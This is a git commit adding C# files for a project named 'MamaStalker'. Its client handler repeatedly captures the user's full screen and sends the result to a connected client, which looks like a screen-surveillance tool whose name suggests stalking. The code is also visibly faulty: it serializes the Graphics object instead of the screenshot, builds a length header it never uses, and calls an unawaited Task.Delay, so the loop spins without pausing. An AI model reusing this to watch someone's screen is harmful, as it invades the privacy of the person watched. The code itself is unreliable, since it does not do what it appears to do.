1e4734e1600e9e28264e19ac717fd24d43c52f75
asafleve123 <asafleve123@gmail.com>
2022-01-20 15:52:47 +0200

    Add Client Handler

---
+++ MamaStalker/MamaStalker/MamaStalkerClientHandler.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Drawing;
+using PingPongServer.Server.Abstract;
+using Commons;
+namespace MamaStalker
+{
+    public class MamaStalkerClientHandler : ClientHandlerBase
+    {
+        public Parser MyParser { get; set; }
+        public int Interval { get; set; }
+        public MamaStalkerClientHandler(IClientConnection clientConnection,int interval) : base(clientConnection)
+        {
+            Interval = interval;
+            MyParser = new Parser();
+        }
+
+        public override Task Job()
+        {
+            while (true) 
+            {
+                Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics graphics = Graphics.FromImage(printscreen as Image);
+                graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
+                byte[] bytes = MyParser.ObjectToByteArray(graphics);
+                byte[] lengthHeader = MyParser.ObjectToByteArray(bytes.Length);
+                MyClientConnection.Send(bytes);
+                Task.Delay(Interval);
+            }
+        }
+    }
+}
---
+++ MamaStalker/MamaStalker/MamaStalkerFactory.cs
@@ -0,0 +1,21 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using PingPongServer.Server.Abstract;
+namespace MamaStalker
+{
+    class MamaStalkerFactory : IClientHandlerFactory
+    {
+        public int Interval { get; set; }
+        public MamaStalkerFactory(int interval)
+        {
+            Interval = interval;
+        }
+        public ClientHandlerBase getClientHandler(IClientConnection clientConnection)
+        {
+            return new MamaStalkerClientHandler(clientConnection,Interval);
+        }
+    }
+}
